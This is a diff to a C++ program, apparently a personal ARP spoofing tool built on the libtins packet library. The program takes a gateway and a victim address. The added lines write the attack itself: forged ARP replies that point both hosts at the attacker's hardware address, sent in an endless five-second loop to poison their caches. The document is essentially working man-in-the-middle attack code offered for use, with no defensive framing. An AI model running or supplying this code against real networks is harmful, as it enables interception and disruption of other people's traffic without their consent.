@@ -1,12 +1,14 @@
 #include<iostream>
 #include<unistd.h>
 #include<tins/tins.h>
+#include<pthread.h>
 
 using namespace std;
 using namespace Tins;
 typedef struct ThreadArgs{
     NetworkInterface iface;
-    IPv4Address gw, victim;
+    IPv4Address gw;
+    IPv4Address victim;
     NetworkInterface::Info info;
 }THREADARGS;
 
@@ -22,13 +24,27 @@ void *doArpSpoofing(void* args)
     cout << "[*] Using Gateway HW Address   " << gw_hw << endl;
     cout << "[*] Using Victim HW Address    " << victim_hw << endl;
     cout << "[*] Using Own HW Address       " << targ->info.hw_addr << endl;
+    ARP gw_arp = ARP(targ->gw,targ->victim,gw_hw,targ->info.hw_addr);
+    ARP victim_arp = ARP(targ->victim,targ->gw,victim_hw,targ->info.hw_addr);
+    gw_arp.opcode(ARP::REPLY);
+    victim_arp.opcode(ARP::REPLY);
+    EthernetII to_gw = EthernetII(gw_hw,targ->info.hw_addr) / gw_arp;
+    EthernetII to_victim = EthernetII(victim_hw,targ->info.hw_addr) / victim_arp;
+
+    while(true){
+        cout << "[-] Send Corrupt ARP" << endl;
+        send.send(to_gw,targ->iface);
+        send.send(to_victim,targ->iface);
+        sleep(5);
+    }
     exit(0);
 }
 
 int main(int argc, char* argv[])
 {
-    pid_t pid;
+    pthread_t thread;
     IPv4Address gw, victim;
+    int i;
     if(argc != 3){
         cout << "[-] Usage " << argv[0] << " <Gateway> <Victim>" << endl;
         return 1;
@@ -53,14 +69,14 @@ int main(int argc, char* argv[])
     }
     cout << "[-] Starting ARP Spoofing..." << endl;
     THREADARGS targ;
-    targ.iface = iface;
     targ.gw = gw;
+    targ.iface = iface;
     targ.victim = victim;
     targ.info = info;
+
     try {
-        pid = fork();
-        if(pid == 0)
-            doArpSpoofing((void*)&targ);
+        pthread_create(&thread,NULL,doArpSpoofing,&targ);
+        pthread_join(thread,(void**)&i);
     }
     catch(runtime_error& e){
         cout << "[!] " << e.what() << endl;
